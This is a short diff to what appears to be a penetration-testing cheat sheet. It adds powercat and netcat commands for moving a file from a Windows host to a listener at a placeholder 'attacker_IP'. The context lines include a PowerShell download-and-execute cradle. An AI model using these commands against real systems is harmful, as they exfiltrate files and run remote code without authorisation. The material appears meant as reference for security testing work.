@@ -1485,6 +1485,12 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 
 # load powercat
 . .\powercat.ps1
+
+# transfer file
+# listen
+nc -lnvp port_here > /path/to/outfile
+# send
+powercat -c attacker_IP -p port_here -i C:\path\to\infile
 ```
 
 
